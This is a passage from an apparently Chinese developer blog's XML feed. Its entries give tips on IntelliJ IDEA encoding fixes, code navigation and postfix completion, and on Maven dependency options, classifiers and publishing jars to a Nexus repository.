调试技巧</li></ul>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IDEA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Intellij IDEA 最新乱码解决必杀技</title>
      <link href="/2025/10/30/%E5%B7%A5%E5%85%B7/Intellij%20IDEA/Intellij%20IDEA%20%E6%9C%80%E6%96%B0%E4%B9%B1%E7%A0%81%E8%A7%A3%E5%86%B3%E5%BF%85%E6%9D%80%E6%8A%80/"/>
      <url>/2025/10/30/%E5%B7%A5%E5%85%B7/Intellij%20IDEA/Intellij%20IDEA%20%E6%9C%80%E6%96%B0%E4%B9%B1%E7%A0%81%E8%A7%A3%E5%86%B3%E5%BF%85%E6%9D%80%E6%8A%80/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.javastack.cn/20190903111112.png"></p><p>大家在使用 Intellij IDEA 的时候会经常遇到各种乱码问题，甚是烦扰。</p><p>栈长也偶尔会用下IDEA，也有一些解决乱码的经验，我给大家总结了以下几类乱码的场景，绝壁能帮你解决 IDEA 各种乱码问题。</p><h2 id="常见乱码场景及解决方案"><a href="#常见乱码场景及解决方案" class="headerlink" title="常见乱码场景及解决方案"></a>常见乱码场景及解决方案</h2><h4 id="1、项目源代码中文乱码"><a href="#1、项目源代码中文乱码" class="headerlink" title="1、项目源代码中文乱码"></a>1、项目源代码中文乱码</h4><blockquote><p>Settings &gt; Editor &gt; File Encodings &gt; Global Encodings &amp; Project Encodings 设置为：<code>UTF-8</code>。</p></blockquote><p><img src="http://img.javastack.cn/20190807113633.png"></p><p>上面红色区域都统一设置一下。</p><h4 id="2、Main方法运行，控制台中文乱码"><a href="#2、Main方法运行，控制台中文乱码" class="headerlink" title="2、Main方法运行，控制台中文乱码"></a>2、Main方法运行，控制台中文乱码</h4><blockquote><p>Settings &gt; Build, Execution, Deployment &gt; Compile &gt; Java Compiler &gt; Additional command line parameters &gt; 设置为：<code>-encoding utf-8</code>。</p></blockquote><p><img src="http://img.javastack.cn/20190807113844.png"></p><h4 id="3、Tomcat运行，控制台中文乱码"><a href="#3、Tomcat运行，控制台中文乱码" class="headerlink" title="3、Tomcat运行，控制台中文乱码"></a>3、Tomcat运行，控制台中文乱码</h4><blockquote><p>Edit Configurations &gt; Tomcat Server &gt; server &gt; VM options &gt; 设置为：<code>-Dfile.encoding=UTF-8</code>。</p></blockquote><p><img src="http://img.javastack.cn/20190807114037.png"></p><blockquote><p>idea &gt; bin &gt; idea.exe.vmoptions 或者 idea64.exe.vmoptions 配置文件末尾添加：<code>-Dfile.encoding=UTF-8</code>。</p></blockquote><p><img src="http://img.javastack.cn/20190807134723.png"></p><p>如果还乱码，继续往下设置。</p><blockquote><p>idea &gt; Help 菜单 &gt; Edit Custom VM Options…菜单，编辑配置文件，在末尾添加：<code>-Dfile.encoding=UTF-8</code>。</p></blockquote><p><img src="http://img.javastack.cn/20190807114251.png"><br><img src="http://img.javastack.cn/20190807114334.png"></p><p>好了，今天的表演就到这了，倍儿爽，建议收藏+转发，日后绝对有用~</p><ul><li>Intellij IDEA 最常用配置详细图解</li><li>Intellij IDEA 非常6的10个姿势</li><li>Intellij IDEA 所有乱码解决方案</li><li>Intellij IDEA 阅读源码的4个绝技</li><li>Intellij IDEA Debug调试技巧</li><li>……</li></ul><p>如果你喜欢 IDEA, 可以点击阅读原文链接加入我们的知识星球，我会经常在上面分享 IDEA 的使用小技巧，对 IDEA 有什么不懂的也可以在上面向我和大家提问。</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IDEA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Intellij IDEA 最蛋疼的 10 个问题！</title>
      <link href="/2025/10/30/%E5%B7%A5%E5%85%B7/Intellij%20IDEA/Intellij%20IDEA%20%E6%9C%80%E8%9B%8B%E7%96%BC%E7%9A%84%2010%20%E4%B8%AA%E9%97%AE%E9%A2%98%EF%BC%81/"/>
      <url>/2025/10/30/%E5%B7%A5%E5%85%B7/Intellij%20IDEA/Intellij%20IDEA%20%E6%9C%80%E8%9B%8B%E7%96%BC%E7%9A%84%2010%20%E4%B8%AA%E9%97%AE%E9%A2%98%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>Intellij Idea以下简称IJ。</p><p>昨天细数了IJ上的10大666的姿势，IJ确实很智能，在很多方便可以完爆Eclipes，可在某些方面真的被Eclipse秒杀</p><h2 id="1、乱码"><a href="#1、乱码" class="headerlink" title="1、乱码"></a>1、乱码</h2><p>在Eclipse中很少遇到控制台乱码的情况，而在IJ中，不管是tomcat还是main方法经常会遇到乱码的情况，有一些可以指定编码解决问题，而有一些是Eclipse正常在IJ中却乱码真的无从解决。</p><h2 id="2、注释模板"><a href="#2、注释模板" class="headerlink" title="2、注释模板"></a>2、注释模板</h2><p>IJ可以自动为文件头、类创建注释也能配置，但对于方法、类的成员属性等只能通过Live Templates来配置，非常麻烦。在这一点上没有Eclipse来的方便，Eeclipse可以很自由的配置各种注释，在IJ上你弄半天，还弄不了一个完美的注释模板。虽然IJ支持从Eclipse导入注释模板，但还是许多不兼容，放弃吧。</p><h2 id="3、部署"><a href="#3、部署" class="headerlink" title="3、部署"></a>3、部署</h2><p>在Eclipse中可以很方便的部署一个web项目到tomcat中，而在IJ中你不熟悉其中的道道真的非常难把一个web项目运行起来。</p><h2 id="4、方法跳转"><a href="#4、方法跳转" class="headerlink" title="4、方法跳转"></a>4、方法跳转</h2><p>在Eclipse中你可以通过ctrl + click的方式直接跳转接口，也可以选择你是跳转接口、接口实现还是父类的接口等，非常方便。而在IJ中，ctrl + click只能跳到接口，想跳实现或者父类接口等自己慢慢熟悉快捷键键吧。</p><h2 id="5、快捷键"><a href="#5、快捷键" class="headerlink" title="5、快捷键"></a>5、快捷键</h2><p>Eclipse的快捷键很多都可以单手完成，非常方便，而IJ里面很多三个、四个的组合快捷键看了实在蛋疼，大部分快捷键都需要两只手来完成，而且要记住这么复杂的快捷键非常麻烦。当然IJ里面可以设置使用Eclipse的快捷键，但有一些还是不兼容的。</p><h2 id="6、查看类方法"><a href="#6、查看类方法" class="headerlink" title="6、查看类方法"></a>6、查看类方法</h2><p>在Eclipse中可以通过ctrl + o快速显示当前类中的所有方法。而在IJ中，你只能打开structure面板来查看，相当于Eclipse中的outline面板，这个不是很方便。</p><h2 id="7、多项目开发"><a href="#7、多项目开发" class="headerlink" title="7、多项目开发"></a>7、多项目开发</h2><p>在Eclipse中一个窗口中可以开发多个项目，也可以运行多个项目，而在IJ中只能工作一个项目，如果想多项目开发只能开多个窗口，而且多窗口的tomcat端口要不一样。</p><h2 id="8、快速组织引用"><a href="#8、快速组织引用" class="headerlink" title="8、快速组织引用"></a>8、快速组织引用</h2><p>在Eclipes中可以快速导入需要的引用并去除无效的引用，而在IJ中没有一键去除无效引用同时导入需要的引用，IJ只有编辑的时候能自动导入和自动去除引用，这个好用，但这会有问题。</p><h2 id="9、平铺Maven模块目录"><a href="#9、平铺Maven模块目录" class="headerlink" title="9、平铺Maven模块目录"></a>9、平铺Maven模块目录</h2><p>在Eclipes中Maven目录都是平铺的，IJ中都是折叠的，如果要平铺需要切换到Project Files视图，这样的话连Package也会一起平铺了。还有Maven中模块都是折叠的，需要一级级展开，不能全部像Eclipse一样展示出来。</p><h2 id="10、快速创建方法"><a href="#10、快速创建方法" class="headerlink" title="10、快速创建方法"></a>10、快速创建方法</h2><p>在Eclipse中随便输入几个字母然后ALT+&#x2F;可以提示自动快速创建一个方法，在IJ中没有找到对应的措施。</p><p>目前来说Eclipse还是占了大部分市场，因为它免费，也是许多开源项目的默认演示工具。</p><p>虽然IJ有这些蛋疼的问题，但我还是宁愿使用IJ，因为它更智能。</p><p>对于以上的IJ诸多问题，如果你有不同异议或者有更好的解决方案，也欢迎在下面留言。</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IDEA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Intellij IDEA 阅读源码的 4 个绝技！</title>
      <link href="/2025/10/30/%E5%B7%A5%E5%85%B7/Intellij%20IDEA/Intellij%20IDEA%20%E9%98%85%E8%AF%BB%E6%BA%90%E7%A0%81%E7%9A%84%204%20%E4%B8%AA%E7%BB%9D%E6%8A%80%EF%BC%81/"/>
      <url>/2025/10/30/%E5%B7%A5%E5%85%B7/Intellij%20IDEA/Intellij%20IDEA%20%E9%98%85%E8%AF%BB%E6%BA%90%E7%A0%81%E7%9A%84%204%20%E4%B8%AA%E7%BB%9D%E6%8A%80%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>前段时间分享了《<a href="https://mp.weixin.qq.com/s/gWMQT6yQhOwcylhKqNJknQ">阅读跟踪 Java 源码的几个小技巧</a>》是基于 Eclipse 版本的，看大家的留言都是想要 IDEA 版本的源码阅读技巧。</p><p>所以，为了满足众多 IDEA 粉丝的要求，栈长我特意做一期 IDEA 版的。</p><h2 id="1、定位到方法实现类"><a href="#1、定位到方法实现类" class="headerlink" title="1、定位到方法实现类"></a>1、定位到方法实现类</h2><pre class="line-numbers language-none"><code class="language-none">public static Object getBean(String name) &#123;return applicationContext.getBean(name);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如以上代码，IDEA 如何跳转到 getBean 方法的实现类？</p><p>在 IDEA 中，CTRL + 鼠标左击 默认会跳到方法所在的接口，如 getBean 就会跳到 BeanFactory 接口里面去。</p><blockquote><p>org.springframework.beans.factory.BeanFactory</p></blockquote><p><img src="http://img.javastack.cn/18-11-8/28812875.jpg"></p><p>在 IDEA 中略显麻烦，在引用的方法上 CTRL + ALT + 鼠标左击（B）可以实现跳转至实现类，如果有多个实现类会弹出让你选择。</p><p><img src="http://img.javastack.cn/18-11-8/8414314.jpg"></p><p>点击右上角 Open as Tool Window 图标还能展开更多详细。</p><p><img src="http://img.javastack.cn/18-11-8/76662103.jpg"></p><h2 id="2、查看类层级关系"><a href="#2、查看类层级关系" class="headerlink" title="2、查看类层级关系"></a>2、查看类层级关系</h2><p>到了 BeanFactory 类，在任意地方使用快捷键 CTRL + H 可以打开类的继承层级面板。</p><p><img src="http://img.javastack.cn/18-11-8/49197466.jpg"></p><p>或者直接选中 BeanFactory 类名称，再按 CTRL + ALT + 鼠标左击（B），同样可以展示 BeanFactory 类的所有继承类的关系。</p><p><img src="http://img.javastack.cn/18-11-8/19092696.jpg"></p><p>还有更屌的！</p><p>右键任意类，选择 Diagrams &gt; Show Diagram… 可以打开类的继承图。</p><p><img src="http://img.javastack.cn/18-11-8/15269334.jpg"></p><p><img src="http://img.javastack.cn/18-11-8/989246.jpg"></p><p><img src="http://img.javastack.cn/18-11-8/84258483.jpg"></p><p><img src="http://img.javastack.cn/18-11-8/84659140.jpg"></p><p>看起来有点乱，那是因为我选择了所有实现类展示，实际请合理利用  Show Parents 和 Show Implementations 菜单。</p><h2 id="3、查看类结构"><a href="#3、查看类结构" class="headerlink" title="3、查看类结构"></a>3、查看类结构</h2><p><img src="http://img.javastack.cn/18-11-8/55959388.jpg"></p><p><img src="http://img.javastack.cn/18-11-8/81818680.jpg"></p><p>如上图所示，IDEA 中也有 Eclipse 中 outline 的面板，叫作：Structure，有了这个面板，可以快速浏览一个类的大纲，也可以快速定位到类的方法、变量等。</p><p>也可以使用快捷键 Alt + 7 调出这个面板。</p><h2 id="4、源码统计"><a href="#4、源码统计" class="headerlink" title="4、源码统计"></a>4、源码统计</h2><p><img src="http://img.javastack.cn/18-11-8/10605575.jpg"></p><p><img src="http://img.javastack.cn/18-11-8/18502731.jpg"></p><p>如图所示，栈长在 IDEA 中装了一个 Statistic 插件，这个插件只支持 JDK 1.8+。</p><p>有了这个插件，它可以在项目中按文件类型进行代码的行数、数量、大小统计。这样你就能知道整个源码的总体数量，你也可以把已经阅读的做统计，慢慢实现源码阅读的攻破。</p><p>熟练的运用 IDEA 中各个小技巧，让阅读跟踪源码变得更轻松。</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IDEA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Intellij IDEA 智能补全的 10 个姿势，太牛逼了。。</title>
      <link href="/2025/10/30/%E5%B7%A5%E5%85%B7/Intellij%20IDEA/Intellij%20IDEA%20%E6%99%BA%E8%83%BD%E8%A1%A5%E5%85%A8%E7%9A%84%2010%20%E4%B8%AA%E5%A7%BF%E5%8A%BF%EF%BC%8C%E5%A4%AA%E7%89%9B%E9%80%BC%E4%BA%86%E3%80%82%E3%80%82/"/>
      <url>/2025/10/30/%E5%B7%A5%E5%85%B7/Intellij%20IDEA/Intellij%20IDEA%20%E6%99%BA%E8%83%BD%E8%A1%A5%E5%85%A8%E7%9A%84%2010%20%E4%B8%AA%E5%A7%BF%E5%8A%BF%EF%BC%8C%E5%A4%AA%E7%89%9B%E9%80%BC%E4%BA%86%E3%80%82%E3%80%82/</url>
      
        <content type="html"><![CDATA[<p>关于智能提示，这次我再分享一篇关于自动补全方面的。</p><p>首先来看一下下面这张图，在方法里面有效位置后面输入一个.，最后面会列表所有可用的自动补全的关键字，这也就是今天要分享的内容。</p><p><img src="http://img.javastack.cn/20190520171322.png"></p><p>下面再介绍几个它们的用法，其实很简单，跟上次一样，这次我同样还是录了动图，这样看得更直观，看起来更牛逼。。</p><h2 id="1、快速打印输出"><a href="#1、快速打印输出" class="headerlink" title="1、快速打印输出"></a>1、快速打印输出</h2><p>除了用 sout 开头快速生成，还能在后面快速生成。</p><p><img src="http://img.javastack.cn/sout.gif"></p><h2 id="2、快速定义局部变量"><a href="#2、快速定义局部变量" class="headerlink" title="2、快速定义局部变量"></a>2、快速定义局部变量</h2><p>在字符串或者数字……后面输入 .var，回车，IDEA会自动推断并快速定义一个局部变量，不过它是 final 类型的。</p><p><img src="http://img.javastack.cn/var.gif"></p><h2 id="3、快速定义成员变量"><a href="#3、快速定义成员变量" class="headerlink" title="3、快速定义成员变量"></a>3、快速定义成员变量</h2><p>在值后面输入.field，可以快速定义一个成员变量，如果当前方法是静态的，那生成的变量也是静态的。</p><p><img src="http://img.javastack.cn/field.gif"></p><h2 id="4、快速格式化字符串"><a href="#4、快速格式化字符串" class="headerlink" title="4、快速格式化字符串"></a>4、快速格式化字符串</h2><p>在字符串后面输入.format，回车，IDEA会自动生成 String.format…语句，牛逼吧！</p><p><img src="http://img.javastack.cn/format.gif"></p><h2 id="5、快速判断（非）空"><a href="#5、快速判断（非）空" class="headerlink" title="5、快速判断（非）空"></a>5、快速判断（非）空</h2><pre class="line-numbers language-none"><code class="language-none">if (xx !&#x3D; null)if (xx &#x3D;&#x3D; null)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>像上面这种判断空&#x2F;非空的情况非常多吧，其实可以快速生成 if 判断语句块，非空：.notnull 或者 .nn，空：.null。</p><p><img src="http://img.javastack.cn/null.gif"></p><h2 id="6、快速取反判断"><a href="#6、快速取反判断" class="headerlink" title="6、快速取反判断"></a>6、快速取反判断</h2><p>输入 .not 可以让布尔值快速取反，再输入 .if 可快速生成 if 判断语句块。</p><p><img src="http://img.javastack.cn/notif.gif"></p><h2 id="7、快速遍历集合"><a href="#7、快速遍历集合" class="headerlink" title="7、快速遍历集合"></a>7、快速遍历集合</h2><p>下面是几种 for 循环语句的快速生成演示，.for, .fori, .forr 都可以满足你的要求。</p><p><img src="http://img.javastack.cn/for.gif"></p><h2 id="8、快速返回值"><a href="#8、快速返回值" class="headerlink" title="8、快速返回值"></a>8、快速返回值</h2><p>在值后面输入.return，可以让当前值快速返回。</p><p><img src="http://img.javastack.cn/return.gif"></p><h2 id="9、快速生成同步锁"><a href="#9、快速生成同步锁" class="headerlink" title="9、快速生成同步锁"></a>9、快速生成同步锁</h2><p>在对象后面输入.synchronized，可以快速生成该对象的同步锁语句块。</p><p><img src="http://img.javastack.cn/synchronized.gif"></p><h2 id="10、快速生成JDK8语句"><a href="#10、快速生成JDK8语句" class="headerlink" title="10、快速生成JDK8语句"></a>10、快速生成JDK8语句</h2><p>下面演示的是快速生成 Lambda 以及 Optional 语句。</p><p><img src="http://img.javastack.cn/jdk8.gif"></p><p>好了，今天栈长就介绍了 Intellij IDEA 如何更使用快速补全功能、涨姿势了吧。</p><ul><li>Intellij IDEA 最常用配置详细图解</li><li>Intellij IDEA 非常6的10个姿势</li><li>Intellij IDEA 所有乱码解决方案</li><li>Intellij IDEA 阅读源码的4个绝技</li><li>Intellij IDEA Debug调试技巧</li></ul>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IDEA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Maven Optional &amp; Exclusions使用区别</title>
      <link href="/2025/10/30/%E5%B7%A5%E5%85%B7/Maven/Maven%20Optional%20&amp;%20Exclusions%E4%BD%BF%E7%94%A8%E5%8C%BA%E5%88%AB/"/>
      <url>/2025/10/30/%E5%B7%A5%E5%85%B7/Maven/Maven%20Optional%20&amp;%20Exclusions%E4%BD%BF%E7%94%A8%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<p>Optional和Exclusions都是用来排除jar包依赖使用的，两者在使用上却是相反。</p><p>Optional定义后，该依赖只能在本项目中传递，不会传递到引用该项目的父项目中，父项目需要主动引用该依赖才行。</p><p>Exclusions则是主动排除子项目传递过来的依赖。</p><h5 id="用法区别"><a href="#用法区别" class="headerlink" title="用法区别"></a>用法区别</h5><blockquote><p>Project-X -&gt; Project-A<br>Project-A -&gt; Project-B</p></blockquote><pre class="line-numbers language-none"><code class="language-none">&lt;project&gt;  ...  &lt;dependencies&gt;    &lt;dependency&gt;      &lt;groupId&gt;sample.ProjectB&lt;&#x2F;groupId&gt;      &lt;artifactId&gt;Project-B&lt;&#x2F;artifactId&gt;      &lt;version&gt;1.0&lt;&#x2F;version&gt;      &lt;scope&gt;compile&lt;&#x2F;scope&gt;      &lt;optional&gt;true&lt;&#x2F;optional&gt;    &lt;&#x2F;dependency&gt;  &lt;&#x2F;dependencies&gt;&lt;&#x2F;project&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如上X依赖A，A依赖B用的<code>&lt;optional&gt;true&lt;/optional&gt;</code>，这时B只能在A中使用，而不会主动传递到X中，X需要主动引用B才有B的依赖。</p><p>如果A不用<code>&lt;optional&gt;true&lt;/optional&gt;</code>引用B，则会传递到X中，X如果不需要B则需要主动排除A传递过来的B。</p><pre class="line-numbers language-none"><code class="language-none">&lt;dependencies&gt;    &lt;dependency&gt;      &lt;groupId&gt;sample.ProjectA&lt;&#x2F;groupId&gt;      &lt;artifactId&gt;Project-A&lt;&#x2F;artifactId&gt;      &lt;version&gt;1.0&lt;&#x2F;version&gt;      &lt;scope&gt;compile&lt;&#x2F;scope&gt;      &lt;exclusions&gt;        &lt;exclusion&gt;          &lt;groupId&gt;sample.ProjectB&lt;&#x2F;groupId&gt;          &lt;artifactId&gt;Project-B&lt;&#x2F;artifactId&gt;        &lt;&#x2F;exclusion&gt;      &lt;&#x2F;exclusions&gt;     &lt;&#x2F;dependency&gt;&lt;&#x2F;dependencies&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以，Optional和Exclusions都是用来控制依赖的传递，可以根据实际场景灵活应用。</p><p>更多具体的定义即说明可参考官方说明文档：</p><blockquote><p><a href="http://maven.apache.org/guides/introduction/introduction-to-optional-and-excludes-dependencies.html">http://maven.apache.org/guides/introduction/introduction-to-optional-and-excludes-dependencies.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Maven </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Maven classifier 元素妙用</title>
      <link href="/2025/10/30/%E5%B7%A5%E5%85%B7/Maven/Maven%20classifier%20%E5%85%83%E7%B4%A0%E5%A6%99%E7%94%A8/"/>
      <url>/2025/10/30/%E5%B7%A5%E5%85%B7/Maven/Maven%20classifier%20%E5%85%83%E7%B4%A0%E5%A6%99%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>首先来看这么一个依赖</p><pre class="line-numbers language-none"><code class="language-none">&lt;dependency&gt;    &lt;groupId&gt;net.sf.json-lib&lt;&#x2F;groupId&gt;    &lt;artifactId&gt;json-lib&lt;&#x2F;artifactId&gt;    &lt;version&gt;2.4&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看似没问题吧？你觉得能下得下来吗？答案是否定的，下不下来。</p><p>来看看Maven的文件索引目录：</p><blockquote><p>Index of &#x2F;maven2&#x2F;net&#x2F;sf&#x2F;json-lib&#x2F;json-lib&#x2F;2.4&#x2F;</p></blockquote><pre class="line-numbers language-none"><code class="language-none">..&#x2F;json-lib-2.4-jdk13.jar                             2010-12-14 05:39               158091json-lib-2.4-jdk13.jar.md5                         2012-11-27 09:40                   32json-lib-2.4-jdk13.jar.sha1                        2012-11-27 09:21                   40json-lib-2.4-jdk13-javadoc.jar                     2010-12-14 05:39               245414json-lib-2.4-jdk13-javadoc.jar.md5                 2012-11-27 09:40                   32json-lib-2.4-jdk13-javadoc.jar.sha1                2012-11-27 09:21                   40json-lib-2.4-jdk13-sources.jar                     2010-12-14 05:39               102628json-lib-2.4-jdk13-sources.jar.md5                 2012-11-27 09:40                   32json-lib-2.4-jdk13-sources.jar.sha1                2012-11-27 09:21                   40json-lib-2.4-jdk15.jar                             2010-12-14 05:39               159123json-lib-2.4-jdk15.jar.md5                         2012-11-27 09:40                   32json-lib-2.4-jdk15.jar.sha1                        2012-11-27 09:21                   40json-lib-2.4-jdk15-javadoc.jar                     2010-12-14 05:39               248552json-lib-2.4-jdk15-javadoc.jar.md5                 2012-11-27 09:40                   32json-lib-2.4-jdk15-javadoc.jar.sha1                2012-11-27 09:21                   40json-lib-2.4-jdk15-sources.jar                     2010-12-14 05:39               104992json-lib-2.4-jdk15-sources.jar.md5                 2012-11-27 09:40                   32json-lib-2.4-jdk15-sources.jar.sha1                2012-11-27 09:21                   40json-lib-2.4.pom                                   2010-12-14 05:39                13082json-lib-2.4.pom.md5                               2012-11-27 09:40                   32json-lib-2.4.pom.sha1                              2012-11-27 09:21                   40<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据Maven默认组织包的结构来看，这里根本找不到json-lib-2.4.jar的包，所以也就下不下来。</p><p>没有标准的jar包，但是有扩展的，如：json-lib-2.4-jdk15.jar，所以，这里要引入classifier这个元素了，classifier元素用来帮助定义构件输出的一些附属构件。</p><p>所以，下面这里加入<code>classifier</code>元素来下载扩展包json-lib-2.4-jdk15.jar。</p><pre class="line-numbers language-none"><code class="language-none">&lt;dependency&gt;    &lt;groupId&gt;net.sf.json-lib&lt;&#x2F;groupId&gt;    &lt;artifactId&gt;json-lib&lt;&#x2F;artifactId&gt;    &lt;version&gt;2.4&lt;&#x2F;version&gt;    &lt;classifier&gt;jdk15&lt;&#x2F;classifier&gt;&lt;&#x2F;dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样就能下载对应的附属构件了。</p><p>这里拿json-lib这个包来举例，但它已经停止更新维护了，不推荐使用，推荐使用fastjson、jackson、gson等json转换框架。</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Maven </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Maven 如何发布 jar 包到 Nexus 私库</title>
      <link href="/2025/10/30/%E5%B7%A5%E5%85%B7/Maven/Maven%20%E5%A6%82%E4%BD%95%E5%8F%91%E5%B8%83%20jar%20%E5%8C%85%E5%88%B0%20Nexus%20%E7%A7%81%E5%BA%93/"/>
      <url>/2025/10/30/%E5%B7%A5%E5%85%B7/Maven/Maven%20%E5%A6%82%E4%BD%95%E5%8F%91%E5%B8%83%20jar%20%E5%8C%85%E5%88%B0%20Nexus%20%E7%A7%81%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<p>Nexus2可以通过管理界面来上传jar包到私库中，而最新的Nexus3却找不到了上传界面，只能通过以下方式来发布到私库。</p><h2 id="发布第三方jar包"><a href="#发布第三方jar包" class="headerlink" title="发布第三方jar包"></a>发布第三方jar包</h2><p>这种情况是maven远程仓库没有，本地有的第三方jar包，需要发布到私库。</p><pre class="line-numbers language-none"><code class="language-none">mvn deploy:deploy-file   -DgroupId&#x3D;com.example  -DartifactId&#x3D;test  -Dversion&#x3D;0.0.1  -Dpackaging&#x3D;jar  -Dfile&#x3D;E:\workspace\test\WebRoot\WEB-INF\lib\test-0.0.1.jar  -Durl&#x3D;http:&#x2F;&#x2F;nexus.example.com:8081&#x2F;repository&#x2F;3rd-repo&#x2F;  -DrepositoryId&#x3D;Nexus<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意file的目录不能和本地仓库目录一致，不然会报错。</p><h2 id="发布自有项目"><a href="#发布自有项目" class="headerlink" title="发布自有项目"></a>发布自有项目</h2><p>公司自己的项目需要发布到Nexus私库提供给其他人依赖，这时可以用上面的方式先打成jar包再发布，也可以使用maven的eclipse插件。</p><p>添置maven pom配置：</p><pre class="line-numbers language-none"><code class="language-none">&lt;distributionManagement&gt;&lt;repository&gt;&lt;id&gt;Nexus&lt;&#x2F;id&gt;&lt;name&gt;Releases&lt;&#x2F;name&gt;&lt;url&gt;http:&#x2F;&#x2F;nexus.example.com:8081&#x2F;repository&#x2F;maven-releases&lt;&#x2F;url&gt;&lt;&#x2F;repository&gt;&lt;snapshotRepository&gt;&lt;id&gt;Nexus&lt;&#x2F;id&gt;&lt;name&gt;Snapshot&lt;&#x2F;name&gt;&lt;url&gt;http:&#x2F;&#x2F;nexus.example.com:8081&#x2F;repository&#x2F;maven-snapshots&lt;&#x2F;url&gt;&lt;&#x2F;snapshotRepository&gt;&lt;&#x2F;distributionManagement&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再在eclipse项目上使用Run As..&gt;Maven build..，在Goals里面输入deploy发布即可。</p><h2 id="Maven-settings配置"><a href="#Maven-settings配置" class="headerlink" title="Maven settings配置"></a>Maven settings配置</h2><p>以上两点其中Nexus指的是maven server的id，大小写敏感，增加以下配置。</p><pre class="line-numbers language-none"><code class="language-none">&lt;servers&gt;    &lt;server&gt;&lt;id&gt;Nexus&lt;&#x2F;id&gt;      &lt;username&gt;admin&lt;&#x2F;username&gt;      &lt;password&gt;admin123&lt;&#x2F;password&gt;    &lt;&#x2F;server&gt;    &lt;&#x2F;servers&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关于Maven的使用及私库的搭建可以翻阅之前的Maven精选系列文章。</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Maven </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Maven 远程仓库地址</title>
      <link href="/2025/10/30/%E5%B7%A5%E5%85%B7/Maven/Maven%20%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93%E5%9C%B0%E5%9D%80/"/>
      <url>/2025/10/30/%E5%B7%A5%E5%85%B7/Maven/Maven%20%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93%E5%9C%B0%E5%9D%80/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;repo1.maven.org&#x2F;maven2&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;maven.jahia.org&#x2F;maven2&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;maven.aliyun.com&#x2F;nexus&#x2F;content&#x2F;groups&#x2F;public&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Maven </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 集成 Swagger，生成接口文档就这么简单！</title>
      <link href="/2025/10/30/%E5%B7%A5%E5%85%B7/Swagger/Spring%20Boot%20%E9%9B%86%E6%88%90%20Swagger%EF%BC%8C%E7%94%9F%E6%88%90%E6%8E%A5%E5%8F%A3%E6%96%87%E6%A1%A3%E5%B0%B1%E8%BF%99%E4%B9%88%E7%AE%80%E5%8D%95%EF%BC%81/"/>
      <url>/2025/10/30/%E5%B7%A5%E5%85%B7/Swagger/Spring%20Boot%20%E9%9B%86%E6%88%90%20Swagger%EF%BC%8C%E7%94%9F%E6%88%90%E6%8E%A5%E5%8F%A3%E6%96%87%E6%A1%A3%E5%B0%B1%E8%BF%99%E4%B9%88%E7%AE%80%E5%8D%95%EF%BC%81/</url>
      
